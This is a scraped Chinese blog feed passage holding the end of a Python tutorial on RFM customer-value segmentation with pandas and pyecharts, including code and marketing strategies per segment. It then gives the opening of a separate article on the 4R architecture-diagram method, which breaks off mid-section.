<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5226b355a85d4129a6c973ec926f2849~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOq6YeM55qE56C05rC055O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617788&amp;x-signature=9Wfjc8HzbdphDSed9UK1IBtjiTc%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-8">完整代码如下</h2>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd
<span class="hljs-keyword">from</span> pyecharts.charts <span class="hljs-keyword">import</span> Bar3D
<span class="hljs-keyword">import</span> pyecharts.options <span class="hljs-keyword">as</span> opts
<span class="hljs-keyword">import</span> os

os.chdir(<span class="hljs-string">r'E:\BaiduNetdiskDownload'</span>)

sheet_names = [<span class="hljs-string">'2015'</span>, <span class="hljs-string">'2016'</span>, <span class="hljs-string">'2017'</span>, <span class="hljs-string">'2018'</span>, <span class="hljs-string">'会员等级'</span>]
sheet_dicts = pd.read_excel(<span class="hljs-string">'./sales.xlsx'</span>, sheet_name=sheet_names)

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sheet_names[:-<span class="hljs-number">1</span>]:
    <span class="hljs-comment"># 删除缺失值</span>
    sheet_dicts[i] = sheet_dicts[i].dropna()
    <span class="hljs-comment"># 过滤掉余额过低的</span>
    sheet_dicts[i] = sheet_dicts[i][sheet_dicts[i][<span class="hljs-string">'订单金额'</span>] &gt; <span class="hljs-number">1</span>]
    <span class="hljs-comment"># 新增一列，表示固定时间</span>
    sheet_dicts[i][<span class="hljs-string">'max_year_date'</span>] = sheet_dicts[i][<span class="hljs-string">'提交日期'</span>].<span class="hljs-built_in">max</span>()
    
<span class="hljs-comment"># 合并数据集</span>
<span class="hljs-comment"># 将前四个表的数据，拼接成 dataFrame</span>
data_merge = pd.concat(<span class="hljs-built_in">list</span>(sheet_dicts.values())[:-<span class="hljs-number">1</span>], ignore_index=<span class="hljs-literal">True</span>)
<span class="hljs-comment"># 给表新增一列，表示年</span>
data_merge[<span class="hljs-string">'year'</span>] = data_merge[<span class="hljs-string">'max_year_date'</span>].dt.year
<span class="hljs-comment"># 间隔时间</span>
data_merge[<span class="hljs-string">'data_interval'</span>] = data_merge[<span class="hljs-string">'max_year_date'</span>] - data_merge[<span class="hljs-string">'提交日期'</span>]
<span class="hljs-comment"># 把间隔时间变成天数</span>
data_merge[<span class="hljs-string">'data_interval'</span>] = data_merge[<span class="hljs-string">'data_interval'</span>].dt.days

<span class="hljs-comment"># 按照 year 和 会员ID分组，分别计算（r 最近购买时间）f(频次) m(金额)三项</span>
rmf_fb = data_merge.groupby([<span class="hljs-string">'year'</span>, <span class="hljs-string">'会员ID'</span>], as_index=<span class="hljs-literal">False</span>).agg(
    r=(<span class="hljs-string">'data_interval'</span>, <span class="hljs-string">'min'</span>),
    f=(<span class="hljs-string">'订单号'</span>, <span class="hljs-string">'count'</span>),
    m=(<span class="hljs-string">'订单金额'</span>, <span class="hljs-string">'sum'</span>)
)

<span class="hljs-comment"># 自定义区间</span>
r_bins = [-<span class="hljs-number">1</span>, <span class="hljs-number">79</span>, <span class="hljs-number">255</span>, <span class="hljs-number">365</span>]
f_bins = [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">130</span>]
m_bins = [<span class="hljs-number">0</span>, <span class="hljs-number">69</span>, <span class="hljs-number">1199</span>, <span class="hljs-number">206252</span>]

pd.cut(rmf_fb[<span class="hljs-string">'r'</span>], bins=<span class="hljs-number">3</span>).unique()
<span class="hljs-comment"># 具体的划分区间的动作，获取 r，f，m 三项的具体评分，自动划分区间。即：不使用自定义的区间分组</span>


<span class="hljs-comment"># 自定义区间 + 评分，R是最后一次购买时间，越小越好，评分是3，2，1</span>
rmf_fb[<span class="hljs-string">'r_label'</span>] = pd.cut(rmf_fb[<span class="hljs-string">'r'</span>], bins=r_bins, labels=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(r_bins) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>)])
<span class="hljs-comment"># F是购买频率，越大越好，评分是，1，2，3</span>
rmf_fb[<span class="hljs-string">'f_label'</span>] = pd.cut(rmf_fb[<span class="hljs-string">'f'</span>], bins=f_bins, labels=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(f_bins))])
<span class="hljs-comment"># M是购买金额，越大越好，评分是，1，2，3</span>
rmf_fb[<span class="hljs-string">'m_label'</span>] = pd.cut(rmf_fb[<span class="hljs-string">'m'</span>], bins=m_bins, labels=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(m_bins))])

rmf_fb[<span class="hljs-string">'r_label'</span>] = rmf_fb[<span class="hljs-string">'r_label'</span>].astype(<span class="hljs-built_in">str</span>)
rmf_fb[<span class="hljs-string">'f_label'</span>] = rmf_fb[<span class="hljs-string">'f_label'</span>].astype(<span class="hljs-built_in">str</span>)
rmf_fb[<span class="hljs-string">'m_label'</span>] = rmf_fb[<span class="hljs-string">'m_label'</span>].astype(<span class="hljs-built_in">str</span>)
rmf_fb[<span class="hljs-string">'rfm_group'</span>] = rmf_fb[<span class="hljs-string">'r_label'</span>] + rmf_fb[<span class="hljs-string">'f_label'</span>] + rmf_fb[<span class="hljs-string">'m_label'</span>]

<span class="hljs-comment"># 1. 安装用户类型，年份分组，统计会议总数</span>
<span class="hljs-comment"># 思路1. value_counts()</span>
<span class="hljs-comment"># rmf_fb.groupby(['rfm_group', 'year'])['会员ID'].value_counts()</span>

<span class="hljs-comment"># 思路2. groupby + 聚合函数</span>
display_data = rmf_fb.groupby([<span class="hljs-string">'rfm_group'</span>, <span class="hljs-string">'year'</span>], as_index=<span class="hljs-literal">False</span>).agg(
    number=(<span class="hljs-string">'会员ID'</span>, <span class="hljs-string">'count'</span>)
)
<span class="hljs-comment"># 修改字段类型</span>
display_data[<span class="hljs-string">'rfm_group'</span>] = display_data[<span class="hljs-string">'rfm_group'</span>].astype(<span class="hljs-built_in">int</span>)

<span class="hljs-comment"># 显示图形</span>
<span class="hljs-comment"># 颜色池</span>
range_color = [<span class="hljs-string">'#313695'</span>, <span class="hljs-string">'#4575b4'</span>, <span class="hljs-string">'#74add1'</span>, <span class="hljs-string">'#abd9e9'</span>, <span class="hljs-string">'#e0f3f8'</span>, <span class="hljs-string">'#ffffbf'</span>,
               <span class="hljs-string">'#fee090'</span>, <span class="hljs-string">'#fdae61'</span>, <span class="hljs-string">'#f46d43'</span>, <span class="hljs-string">'#d73027'</span>, <span class="hljs-string">'#a50026'</span>]

range_max = <span class="hljs-built_in">int</span>(display_data[<span class="hljs-string">'number'</span>].<span class="hljs-built_in">max</span>())
c = (
    Bar3D()<span class="hljs-comment">#设置了一个3D柱形图对象</span>
    .add(
        <span class="hljs-string">""</span>,<span class="hljs-comment">#图例</span>
        [d.tolist() <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> display_data.values],<span class="hljs-comment">#数据</span>
        xaxis3d_opts=opts.Axis3DOpts(type_=<span class="hljs-string">"category"</span>, name=<span class="hljs-string">'分组名称'</span>),<span class="hljs-comment">#x轴数据类型，名称，rfm_group</span>
        yaxis3d_opts=opts.Axis3DOpts(type_=<span class="hljs-string">"category"</span>, name=<span class="hljs-string">'年份'</span>),<span class="hljs-comment">#y轴数据类型，名称，year</span>
        zaxis3d_opts=opts.Axis3DOpts(type_=<span class="hljs-string">"value"</span>, name=<span class="hljs-string">'会员数量'</span>),<span class="hljs-comment">#z轴数据类型，名称，number</span>
    )
    .set_global_opts( <span class="hljs-comment"># 全局设置</span>
        visualmap_opts=opts.VisualMapOpts(max_=range_max, range_color=range_color), <span class="hljs-comment">#设置颜色，及不同取值对应的颜色</span>
        title_opts=opts.TitleOpts(title=<span class="hljs-string">"RFM分组结果"</span>),<span class="hljs-comment">#设置标题</span>
    )
)
c.render() 		      <span class="hljs-comment">#数据保存到本地的网页中.</span>
<span class="hljs-comment"># c.render_notebook() #在notebook中显示</span>
</code></pre>
<h2 data-id="heading-9">总结</h2>
<h3 data-id="heading-10">会员价值度模型介绍</h3>
<ul>
<li>
<p>会员价值度用来评估用户的价值情况，是区分会员价值的重要模型和参考依据，也是衡量不同营销效果的关键指标之一。</p>
</li>
<li>
<p>价值度模型一般基于交易行为产生，衡量的是有实体转化价值的行为。常用的价值度模型是RFM</p>
</li>
<li>
<p>RFM模型是根据会员</p>
<ul>
<li>最近一次购买时间R（Recency）</li>
<li>购买频率F（Frequency）</li>
<li>购买金额M（Monetary）计算得出RFM得分</li>
<li>通过这3个维度来评估客户的订单活跃价值，常用来做客户分群或价值区分</li>
<li>RFM模型基于一个固定时间点来做模型分析，不同时间计算的的RFM结果可能不一样</li>
</ul>



























































<table><thead><tr><th>R</th><th>F</th><th>M</th><th>用户类别</th></tr></thead><tbody><tr><td>高</td><td>高</td><td>高</td><td>重要价值用户</td></tr><tr><td>高</td><td>低</td><td>高</td><td>重要发展用户</td></tr><tr><td>低</td><td>高</td><td>高</td><td>重要保持用户</td></tr><tr><td>低</td><td>低</td><td>高</td><td>重要挽留用户</td></tr><tr><td>高</td><td>高</td><td>低</td><td>一般价值用户</td></tr><tr><td>高</td><td>低</td><td>低</td><td>一般发展用户</td></tr><tr><td>低</td><td>高</td><td>低</td><td>一般保持用户</td></tr><tr><td>低</td><td>低</td><td>低</td><td>一般挽留用户</td></tr></tbody></table>
</li>
<li>
<p>RFM模型的基本实现过程：</p>
<ol>
<li>设置要做计算时的截止时间节点（例如2017-5-30），用来做基于该时间的数据选取和计算。</li>
<li>在会员数据库中，以今天为时间界限向前推固定周期（例如1年），得到包含每个会员的会员ID、订单时间、订单金额的原始数据集。一个会员可能会产生多条订单记录。</li>
<li>数据预计算。从订单时间中找到各个会员距离截止时间节点最近的订单时间作为最近购买时间；以会员ID为维度统计每个用户的订单数量作为购买频率；将用户多个订单的订单金额求和得到总订单金额。由此得到R、F、M三个原始数据量。</li>
<li>R、F、M分区。对于F和M变量来讲，值越大代表购买频率越高、订单金额越高；但对R来讲，值越小代表离截止时间节点越近，因此值越好。对R、F、M分别使用五分位法做数据分区（三分位也可以，分位数越多划分得越详细）。需要注意的是，对于R来讲需要倒过来划分，离截止时间越近的值划分越大。这样就得到每个用户的R、F、M三个变量的分位数值。</li>
<li>将3个值组合或相加得到总的RFM得分。对于RFM总得分的计算有两种方式，一种是直接将3个值拼接到一起，例如RFM得分为312、333、132；另一种是直接将3个值相加求得一个新的汇总值，例如RFM得分为6、9、6。</li>
</ol>
</li>
<li>
<p>在得到不同会员的RFM之后，根据步骤⑤产生的两种结果有两种应用思路</p>
<ul>
<li>思路1：基于3个维度值做用户群体划分和解读，对用户的价值度做分析
<ul>
<li>比如，RFM得分为212的会员的F是1，往往购买频率较低，那就可以针对购买频率低的客户应定期发送促销活动邮件</li>
<li>比如，RFM得分为321的会员虽然购买频率高但是订单金额低等，这些客户往往具有较高的购买黏性，可以考虑通过关联或搭配销售的方式提升订单金额。</li>
</ul>
</li>
<li>思路2：基于RFM的汇总得分评估所有会员的价值度，并可以做价值度排名。同时，该得分还可以作为输入维度与其他维度一起作为其他数据分析和挖掘模型的输入变量，为分析建模提供基础。</li>
</ul>
</li>
<li>
<p>RFM小结：</p>
<ul>
<li>
<p>R就是距离自定义的时间点最近一次购买的时间间隔、间隔越小得分越高</p>
</li>
<li>
<p>F就是自定义的时间范围内购买频率、次数越多得分越高</p>
</li>
<li>
<p>M就是自定义的时间范围内购买总金额，总额越大得分越高</p>
</li>
<li>
<p>RFM的区间和其对应的得分由我们自定义</p>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-11">RFM用户特征分析</h3>
<blockquote>
<p>经过上面的分析，得到了要分析的重点客户群体。可根据用户的量级分为两类</p>
<ul>
<li>第1类是用户群体占比超过10%的群体</li>
<li>第2类是占比在个位数的群体。这两类人由于量级不同，因此需要分别有针对性的策略场景。</li>
<li>除此以外，我们还会增加第3类人群，虽然从用户量级上小，但是单个人的价值度非常高。</li>
</ul>
</blockquote>
<ul>
<li>第1类人群：212、211、312、112、213；占比超过10%的群体。由于这类人群基数大，必须采取批量操作和运营的方式落地运营策略，一般需要通过系统或产品实现，而不能主要依赖于人工
<ul>
<li>212：可发展的一般性群体。这类群体购买新近度和订单金额一般，且购买频率低。考虑到其最大的群体基础，以及在新近度和订单金额上都可以，因此可采取常规性的礼品兑换和赠送、购物社区活动、签到、免运费等手段维持并提升其消费状态。</li>
<li>211：可发展的低价值群体。这类群体相对于212群体在订单金额上表现略差，因此在211群体策略的基础上，可以增加与订单相关的刺激措施，例如组合商品优惠券发送、积分购买商品等</li>
<li>312：有潜力的一般性群体。这类群体购买新近度高，说明最近一次购买发生在很短时间之前，群体对于公司尚有比较熟悉的接触渠道和认知状态；购物频率低，说明对网站的忠诚度一般；订单金额处于中等层级，说明其还具有可提升的空间。因此，可以借助其最近购买的商品，为其定制一些与上次购买相关的商品，通过向上销售等策略提升购买频次和订单金额</li>
<li>112：可挽回的一般性群体。这类群体购买新近度较低，说明距离上次购买时间较长，很可能用户已经处于沉默或预流失、流失阶段；购物频率低，说明对网站的忠诚度一般；订单金额处于中等层级，说明其还可能具有可提升的空间。因此，对这部分群体的策略首先是通过多种方式（例如邮件、短信等）触达客户并挽回，然后通过针对流失客户的专享优惠（例如流失用户专享优惠券）措施促进其消费。在此过程中，可通过增加接触频次和刺激力度的方式，增加用户的回访、复购以及订单价值回报</li>
<li>213：可发展的高价值群体。这类人群发展的重点是提升购物频率，因此可指定不同的活动或事件来触达用户，促进其回访和购买，例如不同的节日活动、每周新品推送、高价值客户专享商品等。</li>
</ul>
</li>
<li>第2类人群：占比为1%～10%的群体。这部分人群数量适中，在落地时无论是产品还是人工都可接入
<ul>
<li>311：有潜力的低价值群体。这部分用户与211群体类似，但在购物新近度上更好，因此对其可采取相同的策略。除此以外，在这类群体的最近接触渠道上可以增加营销或广告资源投入，通过这些渠道再次将客户引入网站完成消费。</li>
<li>111：这是一类在各个维度上都比较差的客户群体。一般情况下，会在其他各个群体策略和管理都落地后才考虑他们。主要策略是先通过多种策略挽回客户，然后为客户推送与其类似的其他群体，或者当前热销的商品或折扣非常大的商品。在刺激消费时，可根据其消费水平、品类等情况，有针对性地设置商品暴露条件，先在优惠券及优惠商品的综合刺激下使其实现消费，再考虑消费频率以及订单金额的提升。</li>
<li>313：有潜力的高价值群体。这类群体的消费新近度高且订单金额高，但购买频率低，因此只要提升其购买频次，用户群体的贡献价值就会倍增。提升购买频率上，除了在其最近一次的接触渠道上增加曝光外，与最近一次渠道相关的其他关联访问渠道也要考虑增加营销资源。另外，213中的策略也要组合应用其中</li>
<li>113：可挽回的高价值群体。这类群体与112群体类似，但订单金额贡献更高，因此除了应用112中的策略外，可增加部分人工的参与来挽回这些高价值客户，例如线下访谈、客户电话沟通等</li>
</ul>
</li>
<li>第3类群体：占比非常少，但却是非常重要的群体
<ul>
<li>333：绝对忠诚的高价值群体。虽然用户绝对数量只有355，但由于其各方面表现非常突出，因此可以倾斜更多的资源，例如设计VIP服务、专享服务、绿色通道等。另外，针对这部分人群的高价值附加服务的推荐也是提升其价值的重点策略</li>
<li>233、223和133：一般性的高价值群体。这类群体的主要着手点是提升新近购买度，即促进其实现最近一次的购买，可通过DM、电话、客户拜访、线下访谈、微信、电子邮件等方式直接建立用户挽回通道，以挽回这部分高价值用户</li>
<li>322、323和332：有潜力的普通群体。这类群体最近刚完成购买，需要提升的是购买频次及购买金额。因此可通过交叉销售、个性化推荐、向上销售、组合优惠券、打包商品销售等策略，提升其单次购买的订单金额及促进其重复购买</li>
</ul>
</li>
</ul>
<h3 data-id="heading-12">案例应用</h3>
<blockquote>
<p>针对上述得到的分析结论，会员部门采取了以下措施</p>
</blockquote>
<ul>
<li>分别针对3类群体，按照公司实际运营需求和当前目标，制定了不同的群体落地的排期</li>
<li>录入数据库的RFM得分数据已经应用到其他数据模型中，成为建模输入的关键维度特征之一</li>
</ul>
<h3 data-id="heading-13">案例注意点</h3>
<blockquote>
<p>R 最近一次消费的间隔时间</p>
<p>F 消费频率</p>
<p>M 消费总额</p>
</blockquote>
<ul>
<li>
<p>不同品类、行业对于RFM的依赖度是有差异的，即使是一个公司在不同的发展阶段和周期下，3个维度的优先级上也会有调整</p>
<ul>
<li>大家电等消费周期较长的行业，R和M会更重要一些</li>
<li>快消等消费周期短且快的行业，更看重R和F</li>
<li>具体要根据当前运营需求与业务部门沟通</li>
</ul>
</li>
<li>
<p>对R、F、M区间的划分是一个离散化的过程，具体需要划分为几个区间需要与业务方确认</p>
<ul>
<li>本案例划分为3个区间，结果对于业务分析而言有些多，意味着业务方需要制定十几套甚至更多的策略</li>
<li>如果业务方要求简化，也可以划分为2个区间，这样出来的分组数最多有8组，策略制定更加简单</li>
<li>具体是划分为2个还是3个，取决于当前业务方有多少资源可以投入到这个事情中来。</li>
</ul>
</li>
<li>
<p>R、F、M的权重打分</p>
<ul>
<li>除了案例中提到的建模方式外，结合业务经验的专家打分法也是常用的思路，这时推荐结合AHP层次分析法打分，这样出来的权重结果更加科学、严谨。</li>
<li>虽然订单数据库中的数据质量相对较高，但可能由于数据采集、数据库同步、ETL、查询、误操作等问题，还是会导致NA值的出现，而NA值的处理非常重要。</li>
<li>R、F、M三个维度的处理（包括计算、离散化、组合、转换）之前都需要注意其数据类型和格式，尤其是有关时间项的转换操作应提前完成</li>
</ul>
</li>
</ul>
<h3 data-id="heading-14">小结</h3>
<ul>
<li>RFM模型是经典的一种用户分群方法，操作起来比较简单，如果数据量不是很大的时候，直接使用Excel就可以实现</li>
<li>RFM并不是在所有业务场景下都可以使用，一般用于零售行业（复购率相对高的行业）</li>
<li>使用Python的cut方法对数据进行分组，需要注意分组区间默认是左开右闭</li>
<li>使用Pyecharts可以方便的绘制出可以交互的3D图</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Gopher 带你学 4R 架构：系统表达的通用法则]]></title>    <link>https://juejin.cn/post/7580288235030265856</link>    <guid>https://juejin.cn/post/7580288235030265856</guid>    <pubDate>2025-12-06T09:16:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580288235030265856" data-draft-id="7580210602079289378" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Gopher 带你学 4R 架构：系统表达的通用法则"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2025-12-06T09:16:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="没多少逻辑"/> <meta itemprop="url" content="https://juejin.cn/user/2717648475395325"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Gopher 带你学 4R 架构：系统表达的通用法则
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648475395325/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    没多少逻辑
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:16:41.000Z" title="Sat Dec 06 2025 09:16:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家是否经常对着复杂的架构图发愁，或者自己画出的图让队友一头雾水？别担心，这篇指南为你介绍 <strong>4R 架构方法</strong>。这不仅是一套简单强大的逻辑框架，更是串联<strong>业务、系统、应用、部署</strong>四大架构图的通用钥匙。</p>
<p>让我们跟随 Gopher 的脚步，从理论到实战，彻底掌握这套系统表达法！</p>
<hr/>
<h2 data-id="heading-0">第一部分：4R 核心体系 (The Core Framework)</h2>
<p>4R 并不是一种新的技术，而是一套让你把“故事讲清楚”的逻辑框架。它包含由宏观到微观、由静态到动态的四个维度。</p>
<h3 data-id="heading-1">① Rank（层级视角）</h3>
<p><strong>一句话概念</strong>：Rank 决定“你用哪个层级视角来观察系统”。</p>
<ul>
<li>
<p><strong>它是什么？</strong><br/>
Rank 指的是架构图和讨论的“观察层级”，比如：企业级、系统级、服务级、模块级或代码级。它回答的核心问题是：“你现在是在看大地图（宏观），还是在看街道图（细节）？</p>
</li>
<li>
<p><strong>为什么需要它？</strong><br/>
如果不先确认 Rank，架构图很容易变成“大杂烩”，粒度混乱（业务、接口、数据库混在一起），导致团队讨论跑偏，无法在同一个频道对话。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dad324468a864cc2800703ca92fd6eab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617400&amp;x-signature=c97KLtB744BS6kQS05KIY8MdSro%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">② Role（系统有哪些角色）</h3>
<p><strong>一句话概念</strong>：Role 告诉我们“系统由哪些关键角色组成”。</p>
<ul>
<li>
<p><strong>它是什么？</strong><br/>
Role 指架构图中的“结构元素列表”，也就是图上的那些“方块”。例如：API、Service、User、DB、Cache、Gateway、JobWorker 等。</p>
</li>
<li>
<p><strong>为什么需要它？</strong><br/>
若不确定 Role，架构图就无法表达“系统本质由什么组成”。这会导致粒度混乱（有的画太大，有的画太细），也无法清晰界定系统的边界和职责。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8846a230630240489c3a4cfb8f23f8b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617400&amp;x-signature=pUoRcqXAp%2BYqIAtebIbU%2FNSOq8c%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">③ Relation（角色之间的关系）</h3>
<p><strong>一句话概念</strong>：Relation 说明“角色之间如何连接与协作”。</p>
<ul>
<li>
<p><strong>它是什么？</strong><br/>
Relation 是架构图中的“箭头与连线”，它描述了调用关系、依赖关系、数据流或事件流。它让系统从一堆孤立的方块变成了“网络化的协作结构”。</p>
</li>
<li>
<p><strong>为什么需要它？</strong><br/>
没有 Relation，架构图只是一堆散落的积木，看不出系统如何运作，也无法理解依赖链条，容易遗漏关键的交互细节（如错误处理、链路失败等）。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6907201292b642548ca90c7bdcba5801~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rKh5aSa5bCR6YC76L6R:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765617400&amp;x-signature=fwuGSe7iZwrLho8KTyAHKOB3hig%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-4">④ Rule（场景中的协作规则）</h3>
<p><strong>一句话概念</strong>：Rule 描述“角色在场景下如何协作完成业务”。</p>
<ul>
<li>
<p><strong>它是什么？</strong><br/>
Rule 是系统的“动态视图”，通常用序列图或流程图表示。它展示了在特定业务场景下（如下单流程），请求是如何流转的、谁先发消息、怎么处理错误以及业务如何闭环。</p>
</li>
<li>
<p><strong>为什么需要它？</strong><br/>
